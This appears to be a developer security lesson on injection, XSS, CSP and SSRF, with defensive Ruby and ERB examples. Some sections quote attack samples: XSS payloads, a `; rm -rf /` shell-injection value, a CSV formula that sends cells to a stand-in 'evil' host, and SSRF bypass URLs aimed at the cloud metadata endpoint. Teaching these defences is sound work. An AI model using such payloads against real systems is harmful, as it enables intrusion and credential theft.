---
title: Injection, XSS and the boundaries they cross
summary: Every injection is the same bug — data reaching a position where something parses it as instructions. Learn the shape and you can find the variants nobody has warned you about.
level: intermediate
minutes: 19
version: "1"
status: stable
last_reviewed: "2026-10-07"
tags: [security, injection, xss, csp, ssrf]
concepts: [injection, xss, context-escaping, ssrf]
prerequisites: [sql-injection, headers]
interview:
  - question: What do all injection vulnerabilities have in common?
    level: intermediate
    answer: >-
      Data crossing into a position where an interpreter parses it as instructions. SQL injection
      is data parsed as SQL, XSS is data parsed as HTML or JavaScript, command injection is data
      parsed by a shell, template injection is data parsed by a template engine, and log injection
      is data parsed by whatever reads the log. Once you see the shape you can evaluate code
      nobody has warned you about, which matters because the list of named injection types keeps
      growing. The general fix is also one thing: keep data as data — use a parameterised interface
      so the data never reaches the parser, rather than trying to sanitise it so the parser treats
      it harmlessly.
    followUps:
      - "When is parameterisation not available?"
  - question: Why is escaping context-dependent?
    level: intermediate
    answer: >-
      Because each context has a different grammar, so the characters that are dangerous differ.
      HTML-escaping a value is correct inside an element's text and insufficient inside a script
      tag, where a quote closes the string literal; inside an attribute, where unquoted attributes
      break on a space; inside a URL, where `javascript:` is a scheme; and inside CSS, where
      `expression()` was executable. So "escape user input" is not a complete instruction — the
      right escaping depends on where the value lands, and a value that moves from one context to
      another needs re-escaping. That is why context-aware templating exists and why string
      concatenation to build markup is the underlying mistake.
    followUps:
      - "What does a strict CSP add on top of that?"
  - question: What is SSRF and why is it unusually dangerous?
    level: advanced
    answer: >-
      Server-side request forgery: you make the server fetch a URL supplied by the attacker, so
      the request comes from inside your network with whatever trust that carries. It is dangerous
      because the server is typically a trusted client — it can reach internal services with no
      authentication, link-local metadata endpoints that hand out cloud credentials, and admin
      interfaces not exposed publicly. A denylist of addresses does not work, because DNS can be
      pointed at an internal address, redirects can be followed to one, and IPv6 and decimal
      notations evade naive parsing. The defence is an allow list of permitted destinations, plus
      resolving and validating the address and blocking redirects.
    followUps:
      - "What is the cloud metadata endpoint specifically?"
resources:
  - title: "OWASP — Cross Site Scripting Prevention"
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
---

## One bug, many names

```text
  data ───────▶ [ interpreter ] ───────▶ it was parsed as code

  SQL injection        → the database's SQL parser
  XSS                  → the browser's HTML/JS parser
  Command injection    → a shell
  Template injection   → a template engine
  LDAP / XPath / NoSQL → those query parsers
  Log injection        → whatever reads the log
  Header injection     → the HTTP parser (CRLF splits a response)
  Deserialisation      → the language's object reconstructor

  The names describe the interpreter, not the bug. The bug is
  always that data reached a parser.
```

:::what
**Injection** is untrusted data reaching an interpreter in a position where it is parsed as
instructions. **Context-aware escaping** transforms a value according to the grammar of where it
lands. **CSP** is a browser-enforced policy restricting what a page may execute and load.
**SSRF** is causing a server to make a request the attacker chooses.
:::

:::why
Learning the shape rather than the list is the point, because the list is unbounded.

Nobody will warn you about every interpreter your code touches. A library that renders a template
from a database column, a function that builds an LDAP filter, a report that writes CSV which
Excel then evaluates as a formula, a YAML loader that instantiates arbitrary classes — none of
these appear on a top-ten list, and all of them are the same shape. If your model is "memorise
the attacks", you are defenceless against the one that has not been named. If your model is "find
where data meets a parser", you can evaluate anything.

The second reason is that the shape tells you which fix is real. There are only two general
answers. **Parameterisation** keeps the data out of the parser's input entirely — a bound
parameter, an argument array instead of a shell string, a structured API instead of a built
string. **Context-aware encoding** transforms the data so the parser treats it as inert, which is
necessary when the data genuinely must be part of the document, as in HTML output.

Everything else — blocklists, stripping quotes, rejecting the word `script` — is an attempt to
guess which inputs are dangerous, and guessing has a losing record of several decades. The attacker
only needs one encoding you did not consider, and there are always more encodings.
:::

:::how
```text
  XSS: THREE KINDS, by where the data flows

  STORED        attacker's payload is saved, then served to others
                → the worst, because it fires for every viewer
                  including administrators
  REFLECTED     payload is in the request and echoed into the
                response
                → needs the victim to follow a crafted link
  DOM-BASED     payload never reaches the server; client-side code
                reads it from the URL and writes it into the DOM
                → invisible to server-side defences and to WAFs,
                  since the payload may be in the fragment after #
                  which browsers never send

  CONTEXT DECIDES THE ESCAPING

    <div>VALUE</div>
      HTML-escape. < > & " '

    <input value="VALUE">
      HTML-escape, and QUOTE the attribute. Unquoted attributes
      break on a space, so `x onmouseover=alert(1)` needs no
      special characters at all.

    <script>var x = "VALUE";</script>
      HTML-escaping does NOT help. `";alert(1);//` closes the
      string. Serialise as JSON instead, or better, do not put
      data in a script block — use a data attribute and read it.

    <a href="VALUE">
      Escaping does not help. `javascript:alert(1)` is a valid
      URL. Validate the scheme against an allow list of http,
      https and mailto.

    <div style="VALUE">
      Historically `expression()` executed. Avoid entirely.

  So "escape user input" is incomplete. The question is always
  "escape for what", and a value that moves between contexts
  needs re-encoding at each step.

  CSP — defence in depth that actually works

    Content-Security-Policy:
      default-src 'self';
      script-src 'nonce-{random}' 'strict-dynamic';
      object-src 'none';
      base-uri 'none';

    A nonce means an injected <script> without the right nonce
    does not execute — so an XSS flaw becomes inert. This is the
    strongest single mitigation available, and it is the one most
    often absent.

    What breaks it: 'unsafe-inline' (which most policies include,
    defeating the purpose), 'unsafe-eval', and a wildcard host.
    A policy with 'unsafe-inline' in script-src is decoration.

  SSRF: why a denylist cannot work

    you block 169.254.169.254 and 127.0.0.1, so the attacker uses:
      http://attacker.com         → DNS resolves to 169.254.169.254
      http://169.254.169.254.nip.io
      http://2852039166/          → decimal form
      http://[::ffff:169.254.169.254]
      http://[::1]
      a 302 redirect to any of the above
      DNS rebinding: resolves safe on your check, internal on
        the fetch

    → allow list the destinations, resolve the hostname yourself,
      validate the resolved IP, and refuse redirects. Blocking is
      a game you lose.
```
:::

:::example
```ruby
# 1. Parameterisation, for each interpreter.

# SQL
User.where("email = ?", input)                 # bound
User.where(email: input)                       # structured

# Shell — pass an argv array, so there is no shell to parse it.
system("convert", input, "out.png")            # safe
system("convert #{input} out.png")             # a shell; `; rm -rf /`
# The array form execs directly with no shell involved, which is
# why it is immune rather than merely escaped.

# NoSQL — a structured query, not an interpolated document.
collection.find(email: input)                  # safe
collection.find("{\"email\": \"#{input}\"}")   # a parser

# Template — never render user-supplied template SOURCE.
ERB.new(user_template).result(binding)         # full RCE
# A template engine is an interpreter for a language that can
# usually reach arbitrary objects. If users must customise output,
# use a sandboxed, logic-less format such as Liquid or Mustache.
```

```erb
<%# 2. Context, in a template. %>
<div><%= value %></div>                             <%# escaped. Safe. %>
<input value="<%= value %>">                        <%# escaped, quoted. %>
<script>var x = <%= value.to_json %>;</script>      <%# JSON, not escape %>
<a href="<%= safe_url(value) %>">                   <%# scheme allow list %>

<%# The helper that makes the URL case correct: %>
<% def safe_url(url)
     parsed = URI.parse(url.to_s)
     %w[http https mailto].include?(parsed.scheme) ? url : "#"
   rescue URI::InvalidURIError
     "#"
   end %>
<%# Note the rescue: URI.parse raises on malformed input, and an
    exception in a view is a different bug with the same cause. %>
```

```ruby
# 3. SSRF defence — allow list, resolve, validate, no redirects.
ALLOWED_HOSTS = %w[api.partner.com cdn.partner.com].freeze

def fetch_external(url)
  uri = URI.parse(url)
  raise Unsafe unless %w[http https].include?(uri.scheme)
  raise Unsafe unless ALLOWED_HOSTS.include?(uri.host)

  # Resolve ourselves and check the ADDRESS, not the name — a
  # permitted hostname can still resolve to an internal address.
  addr = Resolv.getaddress(uri.host)
  raise Unsafe if private_address?(addr)

  # And pin the connection to the address we validated, or DNS
  # rebinding re-resolves between the check and the fetch.
  Net::HTTP.start(addr, uri.port, use_ssl: uri.scheme == "https",
                  open_timeout: 2, read_timeout: 5) do |http|
    req = Net::HTTP::Get.new(uri)
    req["Host"] = uri.host          # so TLS and vhosts still work
    http.request(req)               # and never follow redirects
  end
end

def private_address?(ip)
  addr = IPAddr.new(ip)
  [
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "127.0.0.0/8", "169.254.0.0/16",        # link-local: metadata
    "::1/128", "fc00::/7", "fe80::/10",
  ].any? { |range| IPAddr.new(range).include?(addr) }
end
# 169.254.169.254 is the cloud metadata endpoint on AWS, GCP and
# Azure. On IMDSv1 a plain GET returns temporary IAM credentials,
# which is how SSRF becomes full account compromise — the Capital
# One breach in 2019 was exactly this.
```

```ruby
# 4. CSV injection — the one nobody warns you about, which is why
#    the shape matters more than the list.
csv << [user.name]
# If name is `=HYPERLINK("http://evil/?"&A1,"click")`, Excel
# evaluates it as a formula when the file is opened, and it can
# exfiltrate other cells. The interpreter is a spreadsheet, and it
# is not on any top-ten list.
csv << [sanitise_formula(user.name)]
def sanitise_formula(v)
  v.to_s.start_with?("=", "+", "-", "@", "\t", "\r") ? "'#{v}" : v
end
```
:::

:::failure
**Escaping for the wrong context.** HTML-escaping a value placed inside a `<script>` block. The
escaping runs, the value is still a string literal in JavaScript, and `";alert(1);//` closes it.

**Unquoted attributes.** `<input value=<%= v %>>` needs no special characters to break out — a
space is enough, so `x onfocus=alert(1) autofocus` works through HTML escaping untouched.

**`javascript:` in an href.** Escaping does not help because nothing being escaped is special. The
scheme must be validated against an allow list.

**A blocklist.** Stripping `<script>`, rejecting quotes, filtering the word `alert`. There is
always another encoding: HTML entities, URL encoding, double encoding, UTF-7 historically, SVG
event handlers, `<img onerror>`. Several decades of evidence say this loses.

**`innerHTML` with anything user-derived.** This is DOM XSS, invisible to server-side filtering
and to a WAF — particularly when the payload is in the URL fragment, which browsers never send to
the server. Use `textContent`, or sanitise with DOMPurify if markup is genuinely required.

**A CSP with `unsafe-inline`.** Most deployed policies include it, which defeats the entire
mechanism — an injected inline script is exactly what the policy was supposed to block. Use nonces
or hashes, and treat a policy containing `unsafe-inline` in `script-src` as decoration.

**Shell string interpolation.** `system("tar -xf #{file}")`. Pass an array and there is no shell.

**Rendering user-supplied template source.** A template engine is a language interpreter, usually
with access to the object graph, so this is remote code execution rather than injection.

**Deserialising untrusted data.** `Marshal.load`, `pickle.loads`, Java's `ObjectInputStream`,
`yaml.load` without the safe loader. These reconstruct arbitrary objects and invoke methods during
reconstruction, so they are code execution by design. Use JSON, which has no object
instantiation.

**An SSRF denylist.** DNS, redirects, decimal and IPv6 notations, and rebinding all defeat it.
Allow list, resolve, validate, pin, and do not follow redirects.

**Trusting a filename or a content type.** `../../etc/passwd` as a filename is path traversal, and
`Content-Type: image/png` is a client assertion. Validate the extension against an allow list,
generate your own filename, and check magic bytes rather than the declared type.

**Logging unescaped input.** Newlines let an attacker forge log entries, and a log viewer that
renders HTML gives you XSS in your own admin tooling.
:::

:::realworld
```text
// The defences that actually hold, in order of value.
//
//   1. Parameterised interfaces everywhere one exists. Not
//      escaping — removal of the data from the parser's input.
//   2. Context-aware templating, auto-escaping by default. Modern
//      frameworks do this; the vulnerability is the explicit
//      opt-out (`html_safe`, `raw`, `dangerouslySetInnerHTML`,
//      `v-html`), so those become the greppable review targets.
//   3. A strict CSP with nonces. Turns an XSS flaw into an inert
//      one. The single highest-value header, and usually missing.
//   4. An allow list for anything that becomes a URL, a filename,
//      a column name, a template, or a destination.
//   5. Output encoding at the boundary, not on input. Encoding on
//      input means you no longer know what the data is, and it
//      breaks the moment the same value is rendered in a
//      different context.
//
// Point 5 is worth dwelling on: sanitising on input corrupts your
// data and still gets the context wrong. Store what the user
// typed; encode when you render, for where you render it.
```

```text
// Where the defences get bypassed in practice:
//
//   JSON responses rendered into HTML by the client — the server
//     escaped nothing because it emitted JSON, and the client
//     used innerHTML. The boundary moved and nobody re-checked.
//
//   Markdown rendering — most renderers allow raw HTML by
//     default. A Markdown field is an HTML field unless you
//     disabled that.
//
//   SVG uploads — SVG is XML and can contain <script>. An
//     "image" upload that accepts SVG and serves it from your
//     origin is stored XSS. Serve user uploads from a separate
//     origin, or convert them.
//
//   Open redirects — /login?next=//evil.com. Not XSS, and it
//     makes phishing far more convincing because the link really
//     is your domain. Allow list the paths.
//
//   PDF and document generators — many embed a browser engine or
//     a template language, so the same injection applies with a
//     different interpreter.
```

```bash
# The review greps that find most of this quickly.
grep -rn "html_safe\|raw(\|innerHTML\|dangerouslySetInnerHTML\|v-html"
grep -rn "system(\|exec(\|%x(\|backtick\|Open3.*#{"
grep -rn "Marshal.load\|YAML.load\|pickle.loads\|ObjectInputStream"
grep -rn "URI.parse\|Net::HTTP\|HTTParty\|faraday" # SSRF candidates
grep -rn "ERB.new\|Liquid::Template.parse\|render inline:"
# Each pattern is an interpreter boundary. The question at each hit
# is the same: can the data reaching this be influenced by a user?
```
:::

:::mistakes
**Escaping for the wrong context.** HTML escaping inside a script block or a URL does nothing.

**Unquoted HTML attributes.** A space is enough to break out.

**Unvalidated URL schemes.** `javascript:` is a valid URL.

**Blocklists.** There is always another encoding.

**`innerHTML` with user data.** DOM XSS, invisible server-side.

**`unsafe-inline` in a CSP.** The policy is then decoration.

**Shell string interpolation.** Use an argv array.

**Rendering user-supplied templates.** That is code execution.

**Deserialising untrusted data.** Also code execution.

**An SSRF denylist.** Allow list, resolve, validate, no redirects.

**Trusting filenames or content types.**

**Sanitising on input rather than encoding on output.** Corrupts data and still gets context
wrong.

**Accepting SVG as an image on your own origin.** Stored XSS.
:::

:::tradeoffs
**Parameterisation** — removes the data from the parser entirely, so it is immune rather than
filtered. Available for SQL, shells and most query languages, and not for HTML output.

**Context-aware auto-escaping** — correct by default, and the escape hatch is the vulnerability, so
`html_safe` and friends become the thing to review.

**Manual escaping** — total control and requires knowing the context at every call site, which is
exactly what people get wrong.

**Sanitising HTML (allow list)** — necessary when users genuinely need rich text; a
well-maintained library only, because the parsing differentials between sanitiser and browser are
where bypasses live.

**A strict CSP** — turns an XSS flaw into an inert one, which is a different quality of defence;
costs real work to adopt in an existing application and breaks inline scripts and some third-party
tooling.

**`unsafe-inline`** — easy adoption and no protection. A policy with it is a compliance artefact.

**SSRF allow list** — the only approach that works, and it requires knowing your legitimate
destinations, which is sometimes genuinely unknown for a user-supplied webhook. Then a dedicated
egress proxy with its own network isolation is the answer.

**Validation on input** — catches obvious nonsense early and improves error messages; never
sufficient, because the context is not known at input time.

The frame to keep: **every injection is data reaching a parser, so ask at each boundary whether
the data can get into the grammar.** Parameterise where you can, encode for the specific context
where you cannot, allow-list anything that becomes an identifier or a destination, and add a CSP
so the inevitable missed case does not execute.
:::

:::checkpoint
1. What do SQL injection, XSS, command injection and CSV injection have in common?
2. Why does HTML escaping fail inside `<script>`, inside an unquoted attribute, and inside an
   `href`?
3. Why is a blocklist a losing strategy? Give two encodings that defeat one.
4. What makes DOM-based XSS invisible to a WAF?
5. What does `unsafe-inline` do to a CSP, and why is it so common?
6. Why can an SSRF denylist not work? Name three bypasses.
7. What is at 169.254.169.254, and which breach was it?
8. Why encode on output rather than sanitise on input?
:::

:::interview
Give the unifying shape first, because it is the thing worth having:

*"They are all the same bug: data reaching a position where an interpreter parses it as
instructions. SQL injection is data parsed as SQL, XSS is data parsed as HTML or JavaScript,
command injection is a shell, template injection is a template engine, and CSV injection is
Excel. The names describe the interpreter, not the bug. That matters because the list of named
injection types keeps growing and nobody will warn you about every interpreter your code touches —
but if the model is 'find where data meets a parser', you can evaluate code nobody has written a
cheat sheet for."*

Then be precise about escaping, which is where most answers are vague:

*"And escaping is context-dependent, so 'escape user input' is not a complete instruction.
HTML-escaping is right inside element text and useless inside a script block, where a quote closes
the string literal — there you serialise as JSON, or better, put the value in a data attribute.
Inside an unquoted attribute a space is enough to break out, so `x onfocus=alert(1) autofocus`
needs no special characters. Inside an href, escaping does nothing because `javascript:` contains
nothing special — that needs a scheme allow list. So the two general fixes are parameterisation,
which keeps the data out of the parser entirely, and context-aware encoding where the data must be
part of the document. Blocklists lose, because there is always another encoding."*

Then the one that is most often missing:

*"The highest-value thing I would add is a strict CSP with nonces, because it changes the quality
of the defence — an injected script without the right nonce simply does not execute, so an XSS flaw
becomes inert rather than exploitable. The catch is that most deployed policies include
`unsafe-inline`, which defeats the entire mechanism, so a policy containing it in `script-src` is
decoration rather than protection."*

On SSRF, the denylist point is the one that lands: *"a denylist cannot work. You block
169.254.169.254 and the attacker points DNS at it, or uses the decimal form, or an IPv4-mapped IPv6
address, or a redirect, or DNS rebinding so it resolves safely for your check and internally for
the fetch. The defence is an allow list of destinations, resolving the hostname yourself, validating
the resolved address, pinning the connection to it, and refusing redirects. That endpoint matters
because on IMDSv1 a plain GET returns temporary IAM credentials — which is how the Capital One
breach worked."*
:::

## What you now know

- Every injection is data reaching an interpreter in a position where it is parsed as code.
- The names describe the interpreter; learning the shape covers the variants nobody named.
- Two general fixes: parameterisation (data never reaches the parser) and context-aware encoding.
- Blocklists lose — there is always another encoding.
- Escaping is context-specific: element text, attribute, script, URL and CSS each differ.
- HTML escaping does nothing inside a script block; serialise as JSON instead.
- An unquoted attribute can be escaped from with a space alone.
- URLs need a scheme allow list; `javascript:` contains nothing escapable.
- DOM XSS is invisible server-side, especially when the payload is in the fragment.
- A strict CSP with nonces makes an XSS flaw inert; `unsafe-inline` defeats it entirely.
- Pass an argv array instead of a shell string, so there is no shell.
- Rendering user-supplied templates and deserialising untrusted data are code execution.
- SSRF denylists fail to DNS, redirects, alternative notations and rebinding.
- Allow list destinations, resolve and validate the address, pin it, and refuse redirects.
- 169.254.169.254 serves cloud credentials on IMDSv1 — this was the Capital One breach.
- Encode on output for the specific context; sanitising on input corrupts data and still misses.
- Markdown renderers allow raw HTML by default, and SVG uploads on your origin are stored XSS.
